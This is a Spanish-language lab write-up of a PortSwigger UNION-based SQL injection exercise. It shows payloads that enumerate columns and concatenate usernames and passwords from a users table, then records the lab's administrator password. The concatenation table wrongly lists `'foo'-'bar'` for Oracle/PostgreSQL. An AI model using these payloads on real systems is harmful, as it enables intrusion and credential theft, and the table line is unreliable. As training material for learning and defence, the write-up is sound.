---
title: "SQL injection UNION attack, retrieving multiple values in a single column"
platform: "PortSwigger"
os: "Windows"
difficulty: "Medium"
ip: "10.10.10.XXX"
slug: "sql-injection-union-attack-retrieving-multiple-values-in-a-single-column"
author: "Z4k7"
date: "2026-03-27"
year: "2026"
status: "pwned"
tags:
  - "sqli"
  - "web"
  - "union"
  - "concatenacion"
  - "practitioner"
techniques:
  - "SQL Injection"
  - "UNION attack"
  - "concatenación de columnas"
  - "extracción multi-valor en una sola columna"
tools:
  - "BurpSuite"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "2aeme2oe4v02hmiarb2z"
summary: "La vulnerabilidad de SQL Injection UNION-based en el filtro de categorías permite extraer credenciales de la tabla users. A diferencia del lab anterior, aquí solo la columna 2 acepta strings — por lo que se necesita concatenar username y password en una sola columna usando el operador ||'~'||. Resultado: credenciales del usuario administrator obtenidas en una sola query concatenada.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Prueba inicial con `'--` confirma la inyección:
      - kind: "code"
        lang: "SQL"
        code: |
          '--
      - kind: "image"
        src: "assets/images/Ataque%20de%20inyecci%C3%B3n%20SQL,%20listando%20el%20contenido%20de%20la%20base%20de%20datos%20en%20Oracle/file-20260311142644931.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La aplicación acepta el comentario SQL, confirmando que la entrada se concatena directamente en la consulta."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Reconocimiento siempre primero. La confirmación de `'--` ya te dice que el motor acepta `--` como comentario — eso descarta MySQL puro y te orienta a MSSQL, PostgreSQL u Oracle."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Determinación del número de columnas con `ORDER BY`:
      - kind: "code"
        lang: "SQL"
        code: |
          '+ORDER+BY+1,2--   → Éxito
          '+ORDER+BY+1,2,3-- → Error
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152437572.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se confirma que la consulta original devuelve 2 columnas."
      - kind: "note"
        text: |
          Validación con UNION SELECT NULL:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL--         → Error
          ' UNION SELECT NULL,NULL--    → Éxito ✓
          ' UNION SELECT NULL,NULL,NULL-- → Error
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152518555.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "El ataque UNION requiere exactamente 2 columnas."
      - kind: "note"
        text: |
          Identificación de columna compatible con datos de cadena:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT 'a',NULL-- → Error   (col 1 no acepta string)
          ' UNION SELECT NULL,'a'-- → Éxito ✓ (col 2 acepta string)
          ' UNION SELECT 'a','a'--  → Error
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152559823.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "La columna 2 acepta datos de tipo cadena."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Solo la columna 2 acepta strings — la columna 1 es de tipo int. Esto significa que no puedes extraer username y password en columnas separadas. La solución: concatenarlos en un solo string usando el operador de concatenación del motor."

  - id: "enum_1"
    num: "03"
    title: "Consulta multi-valor — Concatenación en una sola columna"
    content:
      - kind: "note"
        text: |
          Para recuperar múltiples valores en una sola columna se usa el operador de concatenación `||'~'||`:
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260312134701362.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Concatenación por motor de BD:
      - kind: "table"
        headers:
          - "Motor"
          - "Concatenación"
        rows:
          - ["Oracle / PostgreSQL", "`'foo'-'bar'`"]
          - ["Microsoft", "`'foo'+'bar'`"]
          - ["MySQL", "`CONCAT('foo','bar')`"]
      - kind: "note"
        text: |
          Payload utilizado:
      - kind: "code"
        lang: "SQL"
        code: |
          ' UNION SELECT NULL,username ||'~'|| password FROM users--
      - kind: "image"
        src: "assets/images/SQL%20injection%20UNION%20attack,%20retrieving%20multiple%20values%20in%20a%20single%20column/file-20260311152847366.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Se recuperan los pares `username~password` de la tabla `users`."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El separador `~` es útil porque rara vez aparece en datos reales — facilita parsear el resultado. En un engagement real usa un separador más único como `:::` o `§` para evitar falsos positivos. El operador `||` confirma que el motor es Oracle o PostgreSQL."

  - id: "exploit"
    num: "04"
    title: "Acceso Inicial"
    content:
      - kind: "note"
        text: |
          Credenciales obtenidas via concatenación UNION. Login exitoso como administrator.
      - kind: "image"
        src: "assets/images/Ataque%20UNION%20de%20inyecci%C3%B3n%20SQL,%20recuperando%20datos%20de%20otras%20tablas/file-20260311151544808.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "info"
        label: "Evidencia Técnica"
        text: "Autenticación exitosa como `administrator`."

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "2aeme2oe4v02hmiarb2z"

  - id: "privesc_1"
    num: "05"
    title: "Escalada de Privilegios"
    content:
      - kind: "note"
        text: |
          No aplica — el acceso obtenido ya es el de administrador.

lessons:
  - 'Este laboratorio demuestra la importancia de validar entradas y usar consultas parametrizadas.'
  - 'En auditorías, siempre probar con `ORDER BY` y `UNION SELECT` para determinar columnas y tipos de datos.'
  - 'Cuando solo una columna acepta strings, la concatenación con `||''~''||` permite extraer múltiples valores en una sola query.'
  - 'Documentar cada paso con evidencia visual y técnica fortalece la comprensión y la capacidad de replicar el ataque.'
mitigation:
  - 'Implementar prepared statements y consultas parametrizadas.'
  - 'Validar y sanitizar entradas de usuario.'
  - 'Configurar WAF para detectar patrones de `UNION SELECT`.'
  - 'Revisar logs de base de datos en busca de consultas anómalas.'
  - 'Aplicar el principio de menor privilegio en cuentas de base de datos.'
---
